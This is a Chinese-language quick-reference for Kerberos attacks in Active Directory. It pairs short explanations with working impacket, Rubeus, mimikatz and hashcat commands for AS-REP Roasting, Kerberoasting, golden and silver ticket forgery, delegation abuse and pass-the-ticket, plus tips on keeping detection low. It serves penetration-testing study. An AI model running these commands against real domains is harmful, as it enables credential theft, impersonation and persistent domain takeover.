# Kerberos 认证攻击速查

## 0x01 概述
域渗透的核心打法几乎都绕不开 Kerberos。本篇记录 Kerberos 流程速览与六类经典攻击：AS-REP Roasting、Kerberoasting、黄金/白银票据、委派攻击、票据传递。

## 0x02 Kerberos 流程速览

```text
1. AS-REQ  客户端 -> KDC        用口令 hash 加密时间戳，请求 TGT
2. AS-REP  KDC -> 客户端        返回 TGT（krbtgt 密钥加密）
3. TGS-REQ 客户端 -> KDC        用 TGT 请求某服务的服务票据 ST
4. TGS-REP KDC -> 客户端        返回 ST（服务账号密钥加密）
5. AP-REQ  客户端 -> 服务       出示 ST 访问服务
```

攻击的核心观察：**第 2 步和第 4 步返回的数据都是用"口令派生密钥"加密的，拿到后可离线爆破**。

## 0x03 AS-REP Roasting
### 原理
账户设置了 `DONT_REQUIRE_PREAUTH` 时，任何人都能以该用户名义请求 AS-REP，拿回可离线爆破的数据。

### 操作

```bash
# impacket，无需凭据，用户列表枚举
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# 有凭据时指定用户
GetNPUsers.py domain.local/user:password -request
```

爆破：`hashcat -m 18200 asrep.txt dict.txt`

## 0x04 Kerberoasting
### 原理
域内任何用户都能为注册了 SPN 的服务账号请求 ST（TGS-REP），该票据用服务账号口令加密，可离线爆破。服务账号常用弱口令且权限高，是域内最性价比的突破口。

### 操作

```bash
# impacket
GetUserSPNs.py domain.local/user:password -request -outputfile tgs.txt

# Windows: Rubeus
Rubeus.exe kerberoast /outfile:tgs.txt
```

爆破：`hashcat -m 13100 tgs.txt dict.txt`

## 0x05 黄金票据与白银票据
### 对比
| 维度 | 黄金票据 | 白银票据 |
| --- | --- | --- |
| 伪造对象 | TGT | 服务票据 ST |
| 需要的密钥 | krbtgt 账户 hash | 目标服务账号 hash |
| 生效范围 | 全域任意服务 | 仅指定服务 |
| 与 KDC 交互 | 伪造后可直接要 ST | 完全不接触 KDC，更隐蔽 |

### 黄金票据（mimikatz）

```text
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
```

### 白银票据（mimikatz）

```text
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:<服务账号hash> /ptt
```

`/ptt` 直接注入当前会话；impacket 侧用 `ticketer.py` 生成 `.ccache` 配合 `KRB5CCNAME` 使用。

## 0x06 委派攻击
### 三种委派
| 类型 | 特征 | 利用思路 |
| --- | --- | --- |
| 非约束委派 | 服务可拿用户完整 TGT | 诱导高权限账户访问该主机（配合打印机 bug/PetitPotam 强制认证）-> 导出 TGT |
| 约束委派 | 服务仅能假冒用户访问指定服务 | 拿服务账号后 `getST.py -spn-to-spn` 链式换票 |
| 基于资源的约束委派（RBCD） | 委派配置存在目标机器上 | 有机器账户写权限时给自己配置 RBCD -> S4U 拿管理员 ST |

### 常用命令

```bash
# 查询非约束委派主机（PowerView）
Get-DomainComputer -Unconstrained

# impacket S4U 利用（RBCD/约束委派通用姿势）
getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/computer$ -hashes :<hash>
```

## 0x07 票据传递
```bash
# 导出当前机器上的票据
mimikatz "sekurlsa::tickets /export"

# 注入使用
Rubeus.exe ptt /ticket:xxx.kirbi
```

Linux 侧统一走 `.ccache` + `KRB5CCNAME` 环境变量，impacket 全家桶原生支持 `-k -no-pass`。

## 0x08 注意事项
- 票据有有效期（默认 10 小时），黄金票据默认 10 年但要注意 krbtgt 密码重置两次则全部失效（防御方止血标准动作）
- 离线爆破不产生告警，在线枚举 SPN/AS-REP 会产生日志，量要控制
- 2020 后新环境多为 AES 票据，老工具注意 RC4 降级被禁的场景

## 0x09 参考
- [Impacket](https://github.com/fortra/impacket)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [域渗透笔记@uknowsec](https://github.com/uknowsec/Active-Directory-Pentest-Notes)
